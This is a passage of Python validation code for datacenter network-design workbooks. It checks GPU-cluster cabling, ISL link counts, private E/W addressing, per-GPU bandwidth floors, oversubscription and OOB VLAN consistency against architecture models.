                         max(breakouts) if breakouts else None)
        if not effective:
            continue
        missing = sorted(set(range(effective)) - data['seen'])
        if not missing:
            continue
        result.warn(
            "Wire Map",
            f"{sysname} swp{port}: unaccounted sub-port(s) "
            f"{', '.join('s' + str(s) for s in missing)} on an ISL parent "
            f"rendering {effective}x. Wired as ISL: "
            f"{', '.join('s' + str(s) for s in sorted(data['isl']))}. "
            "Every sub-port the breakout creates should either be wired or "
            "carry an explicit 'Unused' Wire Map row, so that spare ISL "
            "capacity is recorded rather than inferred.")


def validate_isl_matches_arch_model(wb, settings, result):
    """The ISL must have the links AND the per-link bandwidth the model specifies.

    Both are published in the ERA deployment guides and transcribed into the
    models:

      network.port_profiles.isl                   -> speed / breakout / lanes
      fabrics.north_south.allocated_ports.isl[su] -> link count, BOTH ENDS

    The guides give the same two facts as an "ISL Ports (both ends)" column per
    scale point and an ISL port-range row reading, e.g., "swp28s0 swp51s1
    Breakout port to 2x 400G ports with 4 lanes" (ERA-00010-001 v03).

    `'default': 0` is NOT "expect zero ISLs" — it encodes the guides' literal
    `N/A` for collapsed configurations, where the leaf is the E/W switch and
    there is no separate N/S ISL. Those SU counts are skipped. Reading 0 as an
    expected count would fail 2-4-3-200, 2-8-5-200 and 2-8-9-400, all of which
    have real ISLs.

    Warning, not error: this is model-vs-sheet drift, not a config the switch
    rejects, and the standing rule is that models are corrected first and
    sheets second, independently — so the validator reports the divergence
    rather than picking a winner.
    """
    if load_arch_model is None:
        return  # public distribution: data-models/ is absent
    if 'VLANs & Profiles' not in wb.sheetnames or 'Wire Map' not in wb.sheetnames:
        return
    arch = str((settings or {}).get('architecture') or '').strip()
    if not arch:
        return
    try:
        model = load_arch_model(arch)
    except ModelError:
        return  # validate_switch_layout_ports already reports load failures

    spec = (((model or {}).get('network') or {}).get('port_profiles') or {}).get('isl') or {}

    # --- geometry / bandwidth -------------------------------------------
    ws = wb['VLANs & Profiles']
    hdr_row = None
    for r in range(1, min(ws.max_row, 60) + 1):
        if str(ws.cell(r, 1).value or '').strip() == 'Profile':
            hdr_row = r
            break
    sheet_geom = None
    if hdr_row is not None:
        for r in range(hdr_row + 1, ws.max_row + 1):
            name = ws.cell(r, 1).value
            if not name:
                break
            if str(name).strip().upper() != 'ISL':
                continue
            try:
                sheet_geom = (str(ws.cell(r, 8).value).strip(),
                              int(float(ws.cell(r, 9).value)),
                              int(float(ws.cell(r, 10).value)))
            except (TypeError, ValueError):
                sheet_geom = None
            break

    if spec and sheet_geom:
        want = (str(spec.get('speed')).strip(),
                int(spec.get('breakout')), int(spec.get('lanes')))
        if want != sheet_geom:
            result.warn(
                "VLANs & Profiles",
                f"ISL geometry disagrees with the {arch} arch model: model "
                f"declares {want[0]} {want[1]}x{want[2]}, workbook declares "
                f"{sheet_geom[0]} {sheet_geom[1]}x{sheet_geom[2]}. Per-parent "
                f"bandwidth may still match, but the two sources of truth have "
                f"diverged and one of them is stale.")

    # --- link count (both ends) ------------------------------------------
    su = _su_count(wb)
    if su is None:
        return
    # `topology_by_su` models carry ISL in the normalized per-SU row; the older
    # `source_derived` shape carried it under fabrics.north_south.allocated_ports.
    # Read the normalized row FIRST: when the schema moved, reading only the
    # legacy path silently disarmed this check for every arch (it found no
    # entry and returned), which is exactly the failure this guard exists to
    # prevent. Keep the legacy read as a fallback for unconverted models.
    row = ((model or {}).get('su_models') or {}).get(su) or {}
    if row.get('ns_mode') == 'converged_in_east_west':
        # The guides' literal N/A: the leaf IS the E/W switch, so there is no
        # separate N/S ISL to count. `topology_by_su` still carries a number
        # here (it describes the converged fabric), so this must be skipped by
        # mode rather than by absence — the legacy shape skipped it by having
        # no per-SU entry at all.
        return
    expected = row.get('ns_isl_cables')
    if expected is None:
        alloc = (((model or {}).get('fabrics') or {}).get('north_south') or {}
                 ).get('allocated_ports', {}).get('isl') or {}
        expected = alloc.get(su, alloc.get(str(su)))
    if not expected:
        # No entry for this scale, or an explicit 0: the guides mark it N/A
        # (collapsed design). 0 means N/A, not zero — comparing against it
        # would fail 2-4-3-200, 2-8-5-200 and 2-8-9-400, which have real ISLs.
        return

    wm = wb['Wire Map']
    header = [str(c.value or '').strip() for c in wm[1]]

    def col(name):
        return header.index(name) if name in header else None

    c_prof = col('Network Profile')
    sides = [(col('System Name (A)'), col('Port (A)')),
             (col('System Name (B)'), col('Port (B)'))]
    if c_prof is None or any(a is None or b is None for a, b in sides):
        return

    # The model's allocated_ports.isl counts N/S switch-to-switch links. The
    # workbook splits those across TWO profile names: 'ISL' where a dedicated
    # N/S spine exists, and 'N/S Leaf Peer' for the leaf<->leaf peer link on
    # collapsed designs. Counting only 'ISL' reads 0 on every collapsed arch
    # and reports a link-count drift that is purely a naming artifact.
    # Resolve both names from the model so a rename moves them together.
    _profiles = ((model or {}).get('network') or {}).get('port_profiles') or {}
    isl_names = set()
    for _role in ('isl', 'ns_leaf_peer'):
        _name = (_profiles.get(_role) or {}).get('profile_name')
        if _name:
            isl_names.add(str(_name).strip().upper())
    isl_names |= {'ISL', 'N/S LEAF PEER'}

    # Count DISTINCT PHYSICAL ports at both ends — one per (switch, parent
    # port) — collapsing breakout sub-ports (swpNs0/swpNs1) onto their parent.
    #
    # `allocated_ports.isl` transcribes the guides' "ISL Ports (both ends)"
    # column, which ERA-00011-001 v04 Table 15 publishes as the count of
    # twin-port OSFP TRANSCEIVERS (and MPO fibres) on the N/S switch-to-switch
    # links — e.g. 2-8-9-800 at 16 nodes (SU4) = 14. A transceiver is a
    # PHYSICAL port; a 2x-breakout ISL parent is one transceiver even though it
    # renders two swpNsX sub-links. So the unit is physical ports, both ends:
    # 7 parents per core switch across a csl<->csl pair is 7 + 7 = 14.
    #
    # Counting sub-port ENDS instead (the pre-fix behaviour) double-counted
    # every 2x-broken-out ISL: a workbook that enumerates swpNs0/swpNs1
    # explicitly scored 28 against a model of 14 and wrongly reported a 2x
    # over-cable (seen on a real 2-8-9-800 4 SU submission). ADR-0049's
    # "(both ends)" reading is preserved — both ends are still counted — but the
    # unit is the physical transceiver, not the broken-out fibre.
    ports = set()
    for row in wm.iter_rows(min_row=2, values_only=True):
        if str(row[c_prof] or '').strip().upper() not in isl_names:
            continue
        for c_sys, c_port in sides:
            sysname = str(row[c_sys] or '').strip()
            if not sysname or 'SPARE' in sysname.upper():
                continue
            m = SWP_PORT_RE.match(str(row[c_port] or '').strip())
            if not m:
                continue
            if _switch_function(wb, sysname) in _NS_FABRIC_ISL_FUNCTIONS:
                ports.add((sysname, m.group(1)))

    ends = len(ports)
    if ends != int(expected):
        result.warn(
            "Wire Map",
            f"ISL link count disagrees with the {arch} arch model at "
            f"{su} SU: model declares {expected} ISL ports (both ends), "
            f"Wire Map wires {ends}. Either the fabric is under/over-cabled "
            f"or the model's allocated_ports.isl is stale for this scale.")


# --- DRB Guidelines slide 12: the two NLA criteria -----------------------------------
#
# Both are Networking Logical Architecture endorsement criteria, so they belong here
# rather than in an internal audit tool: an OEM running `make validate-excel` catches
# them before submitting (ADR-0053 clause 2).

# E/W capacity is identified by the VRF its profile lands in, NOT by the switch role.
# On a collapsed-core arch (2-4-3-200, 2-4-5-400, 2-8-5-200, 2-8-9-400) the SAME `core`
# switch carries the GPU rails and the CPU/In-Band N/S links, so a role test either
# misses the fabric entirely or counts N/S bandwidth as E/W. Only the profile's VRF
# separates them. Verified: a role-based first cut read zero E/W links on four of the
# seven shipped archs and passed its own parametrised test vacuously.
_EW_VRF = 'GPU'

# The E/W spine tier. Uplinks cannot be identified by VRF — the leaf->spine link is an
# `ISL` profile in the default VRF — so this is role-based, and deliberately excludes
# `cs` (the N/S spine).
_EW_SPINE_ROLES = frozenset({'gs-plane1', 'gs-plane2'})

# DRB Guidelines slide 10, verbatim: "If positioning RA for machine learning and AI
# training, average E/W network bandwidth shouldn't be lower than 200Gbps per GPU".
_EW_MIN_GBPS_PER_GPU = 200

# 100.64.0.0/10 is carrier-grade NAT space (RFC 6598) and is NOT an RFC1918 range, so
# the DRB criterion excludes it.
#
# On Python 3.12 `ipaddress` already agrees — 100.64.0.0/10 is absent from
# `_private_networks`, so `is_private` is False and the plain test below flags it. This
# constant is therefore belt-and-braces, kept because that membership list is a stdlib
# implementation detail that has changed between releases: if a future Python starts
# reporting CGNAT as private, the criterion must not silently stop being enforced.
# `test_stdlib_still_agrees_cgnat_is_not_private` pins the assumption so an upgrade
# that flips it fails loudly instead of quietly widening what we accept.
_CGNAT = ipaddress.ip_network('100.64.0.0/10')


def _ew_subnets_are_private(subnets):
    """Return the subnets that are not RFC1918. Blank and malformed entries are skipped.

    DRB Guidelines slide 12: "For server-to-server communication on the E/W Network,
    Private IP addresses with no public IPs used internally".

    Malformed cells are skipped rather than reported: a typo is a different defect with
    its own check, and reporting it as "public IP space" would send an OEM chasing the
    wrong thing.
    """
    bad = []
    for s in subnets:
        text = str(s or '').strip()
        if not text:
            continue
        try:
            net = ipaddress.ip_network(text, strict=False)
        except ValueError:
            continue
        # `subnet_of` raises across address families, so the CGNAT test is IPv4-only.
        cgnat = net.version == 4 and net.subnet_of(_CGNAT)
        if not net.is_private or cgnat:
            bad.append(text)
    return bad


def _vlan_rows(wb):
    """Yield the VLANs block of 'VLANs & Profiles' as dicts, or nothing if absent.

    The sheet holds three stacked blocks (VLANs, VRFs, Port Profiles), each with its
    own header row, so the block is located by its header rather than by a fixed row.
    """
    if 'VLANs & Profiles' not in wb.sheetnames:
        return
    ws = wb['VLANs & Profiles']
    hdr = None
    for r in range(1, min(ws.max_row, 60) + 1):
        if str(ws.cell(r, 1).value or '').strip() == 'VLAN ID':
            hdr = r
            break
    if hdr is None:
        return
    for r in range(hdr + 1, ws.max_row + 1):
        if ws.cell(r, 1).value is None:
            break
        yield {
            'id': str(ws.cell(r, 1).value or '').strip(),
            'name': str(ws.cell(r, 2).value or '').strip(),
            'purpose': str(ws.cell(r, 3).value or '').strip(),
            'subnet': ws.cell(r, 4).value,
            'vrf': str(ws.cell(r, 6).value or '').strip(),
        }


def _ew_vlan_subnets(wb):
    """Subnet strings for the E/W (GPU fabric) VLAN rows.

    Keyed on the GPU VRF, with the Purpose text as a fallback so a workbook that names
    its VRF differently is still checked. Restricted to E/W on purpose: a public range
    on the EXIT VRF is the external edge doing its job, and the criterion is explicitly
    about server-to-server communication on the E/W network.
    """
    out = []
    for row in _vlan_rows(wb):
        purpose = row['purpose'].lower()
        if row['vrf'].upper() == 'GPU' or 'e/w' in purpose or 'east-west' in purpose:
            out.append(row['subnet'])
    return out


def _port_profiles(wb):
    """Yield the Port Profiles block as (name, access_vlan, gbps-or-None)."""
    if 'VLANs & Profiles' not in wb.sheetnames:
        return
    ws = wb['VLANs & Profiles']
    hdr = None
    for r in range(1, min(ws.max_row, 60) + 1):
        if str(ws.cell(r, 1).value or '').strip() == 'Profile':
            hdr = r
            break
    if hdr is None:
        return
    for r in range(hdr + 1, ws.max_row + 1):
        name = ws.cell(r, 1).value
        if not name:
            break
        m = re.match(r'^(\d+)G$', str(ws.cell(r, 8).value or '').strip())
        yield (str(name).strip(),
               str(ws.cell(r, 3).value or '').strip(),
               int(m.group(1)) if m else None)


def _profile_speeds(wb):
    """Port profile name -> Gbps, for profiles whose Speed cell parses."""
    return {n: g for n, _v, g in _port_profiles(wb) if g is not None}


def _deployed_link_gbps(wb):
    """Port profile name -> DEPLOYED per-link Gbps, derived from the Lanes column.

    ADR-0040: a broken-out sub-port runs at ``lanes x 100G``. The soft Speed cell
    transcribes the per-lane 100G, not the link rate, so it cannot be trusted; the
    Lanes count governs. Reading the OEM's ACTUAL breakout lets a capacity check
    credit what they wired rather than the RA profile speed — e.g. an ``Edge Uplink``
    at breakout-8/lanes-1 is 100G, where the 2-8-9-800 RA exit is 200G (lanes-2).

    Returns {} entries only where Lanes parses, so a caller can fall back to the
    model profile speed when a workbook does not declare Lanes.
    """
    if 'VLANs & Profiles' not in wb.sheetnames:
        return {}
    ws = wb['VLANs & Profiles']
    hdr = None
    for r in range(1, min(ws.max_row, 60) + 1):
        if str(ws.cell(r, 1).value or '').strip() == 'Profile':
            hdr = r
            break
    if hdr is None:
        return {}
    out = {}
    for r in range(hdr + 1, ws.max_row + 1):
        name = ws.cell(r, 1).value
        if not name:
            break
        m = re.match(r'^(\d+)$', str(ws.cell(r, 10).value or '').strip())
        if m and int(m.group(1)) > 0:
            out[str(name).strip()] = int(m.group(1)) * 100
    return out


def _ew_profile_names(wb):
    """Port profile names that carry E/W (GPU-fabric) traffic.

    Resolved profile -> access VLAN -> VLAN row -> VRF, so it survives both the OEM
    renaming a profile and the per-rail/single `gpu_vlan_mode` split. Keying on the
    profile NAME instead would break on the first submission that calls its rails
    something else — the real one already does.
    """
    gpu_vlans = {row['id'] for row in _vlan_rows(wb)
                 if row['vrf'].upper() == _EW_VRF and row['id']}
    return {name for name, vlan, _g in _port_profiles(wb) if vlan and vlan in gpu_vlans}


def _ew_leaf_bandwidth(wb):
    """Per E/W switch: (Gbps toward GPU nodes, Gbps toward E/W spines, unsized?).

    Bandwidth, not link count. A 2:1 link-count ratio at double the uplink speed is 1:1
    in capacity, and counting links would report an oversubscription that does not exist.

    Downlinks are identified by the profile's VRF (see `_ew_profile_names`), so the
    E/W switch is whatever the GPU nodes are actually cabled to — `core` on a collapsed
    arch, `gsl-*` or `gl-*` elsewhere — and the CPU/In-Band links landing on that same
    `core` switch are correctly excluded. Uplinks are role-based, because the leaf-to-
    spine link is an `ISL` profile in the default VRF and carries no E/W VRF marker.

    The third element flags that some E/W link's profile speed could not be read. The
    caller must then stay silent: an unsized link counted as 0 Gbps manufactures a
    shortfall out of a cell the workbook simply did not fill in.
    """
    down, up = {}, {}
    if 'Wire Map' not in wb.sheetnames:
        return down, up, False
    wm = wb['Wire Map']
    header = [str(c.value or '').strip() for c in wm[1]]
    for name in ('System Name (A)', 'System Name (B)', 'Network Profile'):
        if name not in header:
            return down, up, False
    c_a = header.index('System Name (A)')
    c_b = header.index('System Name (B)')
    c_prof = header.index('Network Profile')

    speeds = _profile_speeds(wb)
    ew_profiles = _ew_profile_names(wb)
    unsized = False
    links = []
    for row in wm.iter_rows(min_row=2, values_only=True):
        a, b = str(row[c_a] or '').strip(), str(row[c_b] or '').strip()
        if a and b:
            links.append((a, b, str(row[c_prof] or '').strip()))

    # Pass 1 — downlinks. An E/W-profile link with a GPU node on one end; the other
    # end is the E/W switch, whatever it is called.
    for a, b, profile in links:
        if profile not in ew_profiles:
            continue
        role_a, role_b = canonical_category('', a), canonical_category('', b)
        if role_a == 'gpu' and role_b != 'gpu':
            switch = b
        elif role_b == 'gpu' and role_a != 'gpu':
            switch = a
        else:
            continue
        gbps = speeds.get(profile)
        if gbps is None:
            unsized = True
            continue
        down[switch] = down.get(switch, 0) + gbps

    # Pass 2 — uplinks, from a switch pass 1 identified toward an E/W spine.
    for a, b, profile in links:
        role_a, role_b = canonical_category('', a), canonical_category('', b)
        if a in down and role_b in _EW_SPINE_ROLES:
            leaf = a
        elif b in down and role_a in _EW_SPINE_ROLES:
            leaf = b
        else:
            continue
        gbps = speeds.get(profile)
        if gbps is None:
            unsized = True
            continue
        up[leaf] = up.get(leaf, 0) + gbps
    return down, up, unsized


def validate_ew_uses_private_ips(wb, settings, result):
    """DRB Guidelines slide 12: E/W server-to-server must use private IPs only."""
    for bad in _ew_subnets_are_private(_ew_vlan_subnets(wb)):
        result.warn(
            "VLANs & Profiles",
            f"E/W subnet {bad} is not a private (RFC1918) range. The DRB "
            f"guidelines require private IP addresses with no public IPs used "
            f"internally for server-to-server communication on the E/W network.")


def validate_ew_bandwidth_per_gpu(wb, settings, result):
    """DRB Guidelines slide 10: average E/W bandwidth must be >= 200 Gbps per GPU.

    Verbatim: "If positioning RA for machine learning and AI training, average E/W
    network bandwidth shouldn't be lower than 200Gbps per GPU". Every ERA architecture
    is positioned for AI training, so the condition always holds here.

    Model-derived on both sides of the ratio: the wired E/W bandwidth comes from the
    workbook's own profiles, and the GPU count from `gpus_per_su` in the arch model
    times the SU count on the Nodes tab — the same denominator
    `validate_uplink_bandwidth_floors` uses, so the two per-GPU figures in a report
    cannot disagree about how many GPUs there are.

    Measured against all seven shipped archs this lands exactly on each one's nameplate
    bandwidth — 2-4-3-200 and 2-8-5-200 at 200, the 400s at 400, the 800s at 800. Two of
    them sit exactly ON the floor, which is why this compares strictly below it: an
    epsilon in the wrong direction would fail two of our own reference designs.

    WARNING, not error, matching `validate_uplink_bandwidth_floors` — the guides state
    a minimum, and promoting any of these to a hard failure is a deliberate decision
    taken across all of them at once, not backdoored in here.
    """
    if load_arch_model is None:
        return  # public distribution: data-models/ is absent
    arch = str((settings or {}).get('architecture') or '').strip()
    if not arch:
        return
    try:
        model = load_arch_model(arch)
    except ModelError:
        return  # already reported by validate_switch_layout_ports

    su = _su_count(wb)
    gpus_per_su = (model or {}).get('gpus_per_su')
    if not su or not gpus_per_su:
        return
    total_gpus = su * int(gpus_per_su)

    down, _up, unsized = _ew_leaf_bandwidth(wb)
    if unsized or not down:
        # No E/W fabric resolved, or a profile with an unreadable Speed cell. Either
        # way the average is unknown, and "unknown" must not render as "zero".
        return

    aggregate = sum(down.values())
    per_gpu = aggregate / total_gpus
    if per_gpu + 1e-9 < _EW_MIN_GBPS_PER_GPU:
        result.warn(
            "Wire Map",
            f"Average E/W bandwidth is below the DRB floor for {arch} at {su} SU: "
            f"{aggregate}G wired across {total_gpus} GPUs = {per_gpu:.2f} Gb/GPU, but "
            f"the guidelines require at least {_EW_MIN_GBPS_PER_GPU} Gb/GPU for an RA "
            f"positioned for AI training. Either the GPU fabric is under-cabled or "
            f"E/W links are wired under a profile that is not in the {_EW_VRF} VRF.")


def validate_ew_not_oversubscribed(wb, settings, result):
    """DRB Guidelines slide 12: the E/W network must not be oversubscribed.

    Only meaningful once an E/W spine tier exists. In a collapsed topology every leaf
    port is either a downlink or a peer ISL, so the ratio is undefined and this check
    stays silent rather than inventing a verdict — which is the shape of every
    single-SU design we ship.

    Over-provisioning is legal and is not reported: the criterion is "no
    oversubscription ratio", not "exactly 1:1".
    """
    down, up, unsized = _ew_leaf_bandwidth(wb)
    if unsized or not up:
        return
    for leaf in sorted(down):
        d, u = down[leaf], up.get(leaf, 0)
        if u < d:
            ratio = (f"{d / u:.2f}:1" if u else
                     "no uplinks at all, while its peers have some")
            result.warn(
                "Wire Map",
                f"E/W leaf {leaf} is oversubscribed: {d}G toward GPU nodes vs "
                f"{u}G toward the E/W spine ({ratio}). The DRB guidelines "
                f"require no oversubscription ratio on the E/W network.")


# Profile-name aliases for the uplink-capacity floors: {canonical: (fallback, ...)}.
#
# Workbooks built from a pre-ADR-0047 template may wire the storage attachment under
# either name. Our own `public-v6.0.4` default shipped BOTH `Storage` and `Storage
# Uplink` as L2 trunks on VLAN 500 and cabled the storage nodes under `Storage Uplink`;
# an OEM who picked the other name wired the same topology to the same switch ports.
# Scoring the alias as zero reported "0 x 200G" -- which reads as "no storage at all"
# when the real finding was a capacity shortfall on links that are plainly there.
_PROFILE_ALIASES = {
    'Storage Uplink': ('Storage',),
}


def resolve_wired_profile(wired, label):
    """(links, effective_label) for `label`, falling back to a known alias.

    An exact match always wins, so a workbook that wires both names is scored on the
    canonical one and the alias never inflates it. Only a canonical profile with no
    wired links consults the alias list.
    """
    if wired.get(label):
        return wired[label], label
    for alt in _PROFILE_ALIASES.get(label, ()):
        if wired.get(alt):
            return wired[alt], alt
    return 0, label


def validate_uplink_bandwidth_floors(wb, settings, result):
    """External uplink capacity must meet the ERA per-GPU floors.

    ERA-00008/00010/00011/00012/00016 all state the same two minimums, verbatim
    and at every published scale point:

      "network connections towards the customers' network ... designed to
       provide at least 25Gb of bandwidth per GPU"
      "network connections for storage attachment ... at least 12.5Gb of
       bandwidth per GPU"

    These are CLUSTER-LEVEL AGGREGATE floors, not per-node cabling. The guides
    express them as a count of shared uplinks sized against the cluster's total
    GPU count, which is exactly why storage is external (ADR-0047): the floor
    governs what the fabric provisions *toward* storage, not what any node is
    cabled with. Read per node they reproduce none of the published designs.

        aggregate_gbps = wired_uplinks x per_link_speed
        floor          = minimum_gbps_per_gpu x total_GPUs

    The floors come from the model (`network.uplink_capacity`). The per-link
    speed is the OEM's DEPLOYED breakout, read from the workbook's Port Profiles
    Lanes column (ADR-0040: `lanes x 100G`), so an OEM who broke a port out
    slower than the RA is credited at what they wired — an Edge Uplink at
    breakout-8/lanes-1 counts as 100G, not the RA's 200G. Falls back to the
    model `network.port_profiles` speed only when the workbook omits Lanes.

    WARNING, not error. ADR-0047 explicitly leaves the gate-vs-warn decision
    open, and the floors are "at least" minimums that some archs exceed by
    design (2-4-3-200 ships 18.75 / 37.50). Over-provisioning is legal and is
    not reported; only a shortfall is. Promoting this to a hard failure is a
    deliberate follow-up, not something to backdoor in here.
    """
    if load_arch_model is None:
        return  # public distribution: data-models/ is absent
    if 'Wire Map' not in wb.sheetnames:
        return
    arch = str((settings or {}).get('architecture') or '').strip()
    if not arch:
        return
    try:
        model = load_arch_model(arch)
    except ModelError:
        return  # already reported by validate_switch_layout_ports

    su = _su_count(wb)
    gpus_per_su = (model or {}).get('gpus_per_su')
    if not su or not gpus_per_su:
        return
    total_gpus = su * int(gpus_per_su)

    network = (model or {}).get('network') or {}
    policies = network.get('uplink_capacity') or {}
    profiles = network.get('port_profiles') or {}
    if not policies:
        return

    wm = wb['Wire Map']
    header = [str(c.value or '').strip() for c in wm[1]]
    if 'Network Profile' not in header:
        return
    c_prof = header.index('Network Profile')
    wired = {}
    for row in wm.iter_rows(min_row=2, values_only=True):
        name = str(row[c_prof] or '').strip()
        if name:
            wired[name] = wired.get(name, 0) + 1

    deployed = _deployed_link_gbps(wb)
    for role, policy in sorted(policies.items()):
        floor_per_gpu = policy.get('minimum_gbps_per_gpu')
        profile = profiles.get(policy.get('profile') or role) or {}
        label = profile.get('profile_name')
        speed = str(profile.get('speed') or '').strip()
        m = re.match(r'^(\d+)G$', speed)
        if floor_per_gpu is None or not label:
            continue
        # Per-link speed: the OEM's DEPLOYED breakout (ADR-0040 lanes x 100G) when the
        # workbook declares Lanes, else the model profile speed. Crediting the model
        # speed over-credits an OEM who broke the port out slower than the RA — e.g.
        # an Edge Uplink at breakout-8/lanes-1 (100G) vs the RA exit's 200G, which
        # hid half the exit shortfall.
        links, eff_label = resolve_wired_profile(wired, label)
        per_link = deployed.get(eff_label)
        if per_link is None:
            per_link = deployed.get(label)
        if per_link is None:
            if not m:
                continue
            per_link = int(m.group(1))
        aggregate = links * per_link
        required = float(floor_per_gpu) * total_gpus
        if aggregate + 1e-9 < required:
            have = aggregate / total_gpus if total_gpus else 0
            result.warn(
                "Wire Map",
                f"{label} capacity is below the ERA floor for {arch} at {su} SU: "
                f"{links} x {per_link}G = {aggregate}G across {total_gpus} GPUs "
                f"= {have:.2f} Gb/GPU, but the guides require at least "
                f"{floor_per_gpu} Gb/GPU ({required:.0f}G aggregate). Add "
                f"{-(-int(required - aggregate) // per_link)} more {label} "
                f"link(s), or correct the Wire Map if they are wired under a "
                f"different profile name."
                + ("" if eff_label == label else
                   f" Counted {links} link(s) wired as '{eff_label}', which this "
                   f"architecture's template shipped as an interchangeable name for "
                   f"'{label}'."))


def _su_count(wb):
    """Number of distinct `su-NN-` scalable units named on the Nodes sheet."""
    if 'Nodes' not in wb.sheetnames:
        return None
    sus = set()
    for row in wb['Nodes'].iter_rows(min_row=2, values_only=True):
        if not row or len(row) < 2 or not row[1]:
            continue
        m = re.match(r'su-(\d+)', str(row[1]).strip(), re.IGNORECASE)
        if m:
            sus.add(m.group(1))
    return len(sus) or None


def _nodes_switch_functions(wb):
    """{switch name: lowercased Function} from the Nodes sheet.

    Columns are resolved BY HEADER NAME, not by position. ADR-0028 inserted an
    `OOB VLAN` column at index 2, which shifted `Type` from index 2 to 3. Code
    that hardcoded `row[3] == 'switch'` therefore matched nothing on any
    pre-ADR-0028 workbook — including the ones the public release emits and the
    ones OEM partners submit for endorsement.

    The failure was silent and worse than no check: every switch resolved to
    `''`, the `_NS_FABRIC_ISL_FUNCTIONS` filter dropped every ISL end, and the
    link-count check reported "Wire Map wires 0" on a fabric wiring 142 ISL
    rows — a fabricated under-cabling finding against a workbook that had
    already passed a full 5-phase validate-all. See ERA-81.

    `Function` and `Name` are index 0/1 in both schemas, so they are only used
    as a fallback when the header row is missing or unrecognisable.
    """
    if 'Nodes' not in wb.sheetnames:
        return {}
    ws = wb['Nodes']
    header = [str(c.value or '').strip().lower() for c in ws[1]]

    def col(label, fallback):
        try:
            return header.index(label)
        except ValueError:
            return fallback

    i_fn, i_name, i_type = col('function', 0), col('name', 1), col('type', None)
    functions = {}
    for row in ws.iter_rows(min_row=2, values_only=True):
        if not row:
            continue
        need = max(i for i in (i_fn, i_name, i_type) if i is not None)
        if len(row) <= need:
            continue
        fn, nm = row[i_fn], row[i_name]
        if not fn or not nm:
            continue
        # Without a resolvable Type column, fall back to accepting the row:
        # a wrong-but-present mapping beats silently classifying nothing.
        if i_type is not None and str(row[i_type] or '').strip().lower() != 'switch':
            continue
        functions[str(nm).strip()] = str(fn).strip().lower()
    return functions


def _switch_function(wb, name):
    """Nodes-sheet Function for a switch, lowercased ('' when unknown)."""
    cache = getattr(wb, '_era_fn_cache', None)
    if cache is None:
        cache = _nodes_switch_functions(wb)
        try:
            wb._era_fn_cache = cache
        except AttributeError:
            pass
    return cache.get(name, '')


def validate_cross_sheet_data(settings, parsed_nodes, parsed_vlans, result):
    """Cross-validate data between Settings, Nodes, and VLANs sheets.

    The mgmt_subnets-based node-IP-containment and VLAN-overlap checks that
    used to live here were removed with mgmt_subnets itself. This
    is the OOB-VLAN-based replacement, built on the same
    resolve_oob_vlans() mapping the topology/inventory generator uses:

      a. VLAN-id collision — an id can't be both an OOB VLAN (VRF=OOB) and
         a non-OOB VLAN.
      b. Invalid OOB-VLAN reference — an OOB switch's Nodes-tab 'OOB VLAN'
         value must name a real VRF=OOB VLAN.
      c. Device mgmt IP within an OOB VLAN subnet (hard-fail, ERA-41) — a
         mgmt IP outside every OOB subnet is unreachable. Replaces the
         mgmt_subnets-based node-IP-containment check.
      d. Multiple distinct OOB VLAN subnets require L3 OOB.
    """
    oob_nodes = [
        n for n in parsed_nodes
        if canonical_category(n.get('function'), n.get('name')) == 'oob-switch'
    ]
    mapping = resolve_oob_vlans(parsed_vlans, oob_nodes)

    # (a) VLAN-id collision: an id used by both an OOB and a non-OOB VLAN.
    oob_ids = {int(v['id']) for v in mapping['oob_vlans']}
    non_oob_ids = {
        int(v['id']) for v in parsed_vlans
        if str(v.get('vrf', '')).upper() != 'OOB'
        and str(v.get('id', '')).strip().lstrip('-').isdigit()
    }
    for vid in oob_ids & non_oob_ids:
        result.error(
            "VLANs & Profiles",
            f"VLAN id {vid} is used by both an OOB and a non-OOB VLAN; "
            f"OOB VLAN ids must be unique.")

    # (b) Invalid OOB-VLAN reference: OOB switch names an OOB VLAN id that
    # doesn't resolve to a real VRF=OOB VLAN. A blank 'OOB VLAN' cell is only
    # valid when there is exactly one OOB VLAN to default to (resolve_oob_vlans
    # sets default_vlan_id in that case); with zero or >1 OOB VLANs, a blank
    # cell resolves to None and must be flagged too, otherwise the switch's
    # SVI silently drops with no error.
    for node in oob_nodes:
        raw = str(node.get('oob_vlan', '') or '').strip()
        name = node.get('name')
        if mapping['vlan_by_switch'].get(name) is not None:
            continue
        if raw:
            result.error(
                "Nodes",
                f"OOB switch {name} names OOB VLAN '{raw}', which is not "
                f"a VRF-OOB VLAN in 'VLANs & Profiles'.")
        elif mapping['default_vlan_id'] is None:
            result.error(
                "Nodes",
                f"OOB switch {name} must name an OOB VLAN in its 'OOB VLAN' "
                f"column when more than one OOB VLAN exists.")

    # (c) Device mgmt IP within an OOB VLAN subnet (hard-fail, ERA-41). A mgmt
    # IP outside every OOB subnet is unreachable (surfaced live in the field:
    # storage-07 assigned .160, outside the declared /27 → server unreachable).
    # Only runs when at least one OOB VLAN subnet resolved — otherwise there's
    # nothing to check against (and every device would spuriously fail).
    oob_nets = []
    for subnet in mapping['subnets']:
        try:
            oob_nets.append(ipaddress.IPv4Network(subnet, strict=False))
        except ValueError:
            continue  # malformed subnet already reported elsewhere
    # A SWITCH may instead be addressed on the air-mgmt plane: that is the
    # plane its eth0 actually lands on, and the one `ansible_host` targets
    # (excel_parser.py assigns switch eth0 IPs across it). So a switch is
    # reachable if its mgmt IP is inside an OOB VLAN subnet OR inside
    # air_mgmt_subnet. This preserves ADR-0041's intent — the question is
    # "is this device reachable", not "is it on the OOB plane specifically" —
    # while letting a brownfield operator pin the real addresses their
    # switches already answer on. A switch outside BOTH planes still fails.
    _air_net = None
    _air_subnet_str = (settings or {}).get('air_mgmt_subnet') or DEFAULT_AIR_MGMT_SUBNET
    try:
        _air_net = ipaddress.IPv4Network(str(_air_subnet_str).strip(), strict=False)
    except ValueError:
        _air_net = None  # malformed CIDR already reported by _validate_air_mgmt_overlap

    if oob_nets:
        nets_str = ', '.join(str(n) for n in oob_nets)
        for n in parsed_nodes:
            category = canonical_category(n.get('function'), n.get('name'))
            if category in _OOB_SUBNET_EXEMPT_CATEGORIES:
                continue
            ip_str = n.get('ip')
            if not ip_str:
                continue
            try:
                addr = ipaddress.IPv4Address(ip_str)
            except ValueError:
                continue  # malformed IP already reported elsewhere
            if any(addr in net for net in oob_nets):
                continue
            is_switch_cat = category in _SWITCH_CATEGORIES
            if is_switch_cat and _air_net is not None and addr in _air_net:
                continue  # operator-pinned on the air-mgmt plane — reachable
            _planes = nets_str
            if is_switch_cat and _air_net is not None:
                _planes = f"{nets_str}, or the air-mgmt subnet {_air_net}"
            result.error(
                "Cross-sheet",
                f"Node {n.get('function')} (row {n.get('row')}): mgmt "
